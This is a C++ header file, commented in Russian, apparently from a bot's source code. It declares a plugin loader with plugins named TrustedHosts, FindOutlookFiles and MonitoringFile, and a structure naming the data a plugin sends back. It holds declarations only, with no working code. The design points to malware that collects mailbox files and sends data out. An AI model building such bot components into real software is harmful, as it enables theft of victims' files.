#pragma once

#include "core\core.h"
#include "config.h"

//выполняет плагины зашитые в бота, в config.h включаются или отключаются
namespace Plugins
{

void Execute();

#ifdef PLUGINS_TRUSTED_HOSTS
DWORD WINAPI TrustedHosts( void* );
#endif

#ifdef PLUGINS_FIND_OUTLOOK_FILES
DWORD WINAPI FindOutlookFiles( void* );
#endif

#ifdef PLUGINS_MONITORING_FILE
DWORD WINAPI MonitoringFile( void* );
#endif

}

//выполнение плагина
namespace Plugin
{
//типы колбек функций для плагинов
const int PluginCBNone = 0; //нет вызова колбек функции
const int PluginCBText = 1; //текстовая (void cb(const char*))
const int PluginWait = 2; //после запуска плагина ожидать

//структура для настройки плагина
struct PluginStru
{
	char name[32]; //имя плагина
	int cbtype; //тип колбек функции
	char func_start[32]; //функция запускаемая при старте плагина
	char name_func[32]; //имя функции колбека
	char name_data[32]; //под каким именем отсылать данные полученные колбек функцией
	int size; //размер плагина, заполняется автоматом при получении плагина
};

void Run( PluginStru* plg );
void Stop( const char* namePlugin, const char* func_stop );
void ExecuteFunc( const char* namePlugin, const char* func, const char* args );

}
